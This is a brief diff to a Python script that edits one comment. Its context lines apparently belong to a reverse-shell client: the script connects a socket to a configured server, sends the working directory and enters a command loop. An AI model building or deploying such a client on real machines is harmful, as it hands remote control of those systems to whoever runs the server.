@@ -16,7 +16,7 @@ SEPERATOR = '<sep>'
 sock = socket.socket()
 sock.connect((SERVER_HOST, SERVER_PORT))
 
-cwd = os.getcwd() #command
+cwd = os.getcwd() #current working directory
 sock.send(cwd.encode())
 
 while True:
